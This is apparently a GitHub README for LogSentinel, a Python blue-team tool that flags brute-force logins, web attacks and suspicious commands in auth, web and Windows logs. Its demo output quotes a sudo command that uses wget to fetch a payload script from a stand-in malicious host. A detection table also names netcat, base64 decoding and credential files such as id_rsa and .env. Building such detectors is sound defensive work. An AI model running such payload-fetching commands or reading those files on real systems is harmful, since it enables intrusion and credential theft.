# 🔍 LogSentinel

> A Python-based security log analyzer that detects threats, anomalies, and attack patterns across auth, Apache, Nginx, syslog, and Windows event logs.

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat&logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=flat)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat)](#)
[![Category](https://img.shields.io/badge/Category-Blue%20Team%20%7C%20SOC-navy?style=flat)](#)

---

## 📸 Demo

```
  _                ____             _   _            _
 | |    ___   __ _/ ___|  ___ _ __ | |_(_)_ __   ___| |
 | |   / _ \ / _` \___ \ / _ \ '_ \| __| | '_ \ / _ \ |
 | |__| (_) | (_| |___) |  __/ | | | |_| | | | |  __/ |
 |_____\___/ \__, |____/ \___|_| |_|\__|_|_| |_|\___|_|
             |___/
  Security Log Analyzer v1.0  |  Blue Team / SOC Practice  |  by hashtags2023

[*] Parsing: auth.log
    → 13 events parsed

[*] Running threat detection on 13 events...

============================================================
  THREAT DETECTION RESULTS
============================================================

  🟠 [HIGH] SSH Brute-Force Attack — 192.168.1.50
     8 failed SSH login attempts from 192.168.1.50 (threshold: 5)

  🟠 [HIGH] Suspicious sudo command — jdoe
     User 'jdoe' ran a suspicious command: /usr/bin/wget http://malicious.example.com/payload.sh

  🟠 [HIGH] Direct Root Login Detected
     2 direct root login(s) observed.

  🟠 [HIGH] New User Account Created — backdooruser
     A new user account was created: backdooruser

  🟡 [MEDIUM] After-Hours Login Activity (1 event(s))
     1 successful login(s) occurred between 22:00 and 06:00

------------------------------------------------------------
  🔴 Critical : 0   🟠 High : 4   🟡 Medium : 1   🔵 Info : 0
============================================================
```

---

## 🛡️ Detection Capabilities

| Module                   | What It Detects                                                                      |
| ------------------------ | ------------------------------------------------------------------------------------ |
| **SSH Brute Force**      | Repeated failed login attempts from a single IP (configurable threshold)             |
| **Web Attacks**          | SQL injection, XSS, path traversal, LFI, sensitive file probing                      |
| **Suspicious Commands**  | Dangerous sudo commands (wget/curl downloads, /tmp execution, base64 decode, netcat) |
| **Privilege Escalation** | Direct root logins, session escalation                                               |
| **Account Activity**     | New user account creation                                                            |
| **After-Hours Logins**   | Successful logins between 10 PM – 6 AM                                               |
| **Windows Events**       | Monitors critical Event IDs: 4625, 4720, 4728, 4732, 1102, 7045, and more            |
| **High-Value Paths**     | Access to `/etc/passwd`, `/.ssh/`, `/proc/`, `id_rsa`, `.env`, etc.                  |
| **Scanner Activity**     | Detects Nikto, sqlmap, Nessus, OpenVAS, and other scanner signatures                 |

---

## 🚀 Getting Started

### Prerequisites

- Python 3.10+
- No external dependencies (standard library only)

### Installation

```bash
git clone https://github.com/hashtags2023/logsentinel.git
cd logsentinel
```

### Usage

```bash
# Analyze a single auth log
python -m analyzer.main sample_logs/auth.log -t auth

# Auto-detect log type
python -m analyzer.main sample_logs/access.log

# Verbose output (shows evidence lines)
python -m analyzer.main sample_logs/auth.log -t auth -v

# Save HTML report
python -m analyzer.main sample_logs/auth.log -t auth -o reports/report.html

# Save JSON report (for SIEM/pipeline integration)
python -m analyzer.main sample_logs/auth.log -t auth -o reports/report.json

# Process all logs in a directory
python -m analyzer.main sample_logs/ --all -o reports/full_report.html

# Custom brute-force threshold (default: 5)
python -m analyzer.main sample_logs/auth.log --threshold 10
```

---

## 📊 Report Output

LogSentinel generates **HTML** and **JSON** reports with severity-coded findings and remediation guidance.

**HTML Report** — Dark-themed, color-coded by severity:

- 🔴 Critical — Immediate action required
- 🟠 High — Investigate promptly
- 🟡 Medium — Review and monitor
- 🔵 Info — Informational

**JSON Report** — Machine-readable for integration with SIEM pipelines, dashboards, or alerting systems.

---

## 🗂️ Project Structure

```
logsentinel/
├── analyzer/
│   ├── __init__.py
│   ├── main.py          # CLI entry point
│   ├── parser.py        # Log format parsers (auth, Apache, Nginx, syslog, Windows)
│   └── detectors.py     # Threat detection rules
├── utils/
│   ├── __init__.py
│   ├── banner.py        # ASCII banner
│   └── report.py        # HTML & JSON report generator
├── sample_logs/
│   ├── auth.log         # Sample Linux auth log with brute force + privilege escalation
│   └── access.log       # Sample Apache log with web attacks
├── reports/             # Output directory for generated reports
└── README.md
```

---

## 🧠 Security Concepts Demonstrated

- **Log Analysis** — Parsing and correlating multiple log formats (Linux auth, Apache/Nginx, syslog, Windows Events)
- **Threat Detection** — Rule-based anomaly and attack detection without external libraries
- **OWASP Top 10** — Detection of injection, XSS, path traversal, sensitive data exposure
- **Brute-Force Detection** — IP-based login failure aggregation and thresholding
- **Windows Security Events** — Monitoring of critical Event IDs used in real SOC environments
- **Reporting** — Structured, actionable output with severity classification and remediation advice
- **Behavioral Anomaly** — After-hours login detection and suspicious command identification

---

## 🗺️ Roadmap

- [ ] Real-time log tailing (`--watch` mode)
- [x] IP reputation lookup integration (AbuseIPDB API)
- [ ] Geolocation of attacker IPs
- [ ] Slack / email alerting
- [ ] MITRE ATT&CK technique mapping
- [ ] Dashboard web UI with Plotly charts
- [ ] Regex-based custom rule engine (YAML config)
- [ ] Docker support

---

## 🧪 Testing with Sample Logs

The repo includes sample logs demonstrating each detection:

```bash
# Brute force + root login + suspicious command + new user creation
python -m analyzer.main sample_logs/auth.log -t auth -v

# SQL injection + XSS + path traversal + sensitive file probing
python -m analyzer.main sample_logs/access.log -t apache -v
```

For more realistic testing, try against:

- [DVWA](https://github.com/digininja/DVWA) — Generates real web attack logs
- [Metasploitable](https://sourceforge.net/projects/metasploitable/) — Generates real auth/syslog events
- [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net/) — Real-world pcap and log samples

---

## ⚠️ Legal Notice

This tool is intended for **authorized security testing, blue team practice, and educational use only**. Only analyze logs from systems you own or have explicit written permission to analyze.

---

## 👩‍💻 Author

**Lori (hashtags2023)**
B.S. Computer Science — CSU Sacramento | Cybersecurity & AI Enthusiast

[![LinkedIn](https://img.shields.io/badge/-LinkedIn-0077B5?style=flat&logo=linkedin&logoColor=white)](https://linkedin.com/in/lori-cs-security)
[![GitHub](https://img.shields.io/badge/-GitHub-181717?style=flat&logo=github&logoColor=white)](https://github.com/hashtags2023)

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.
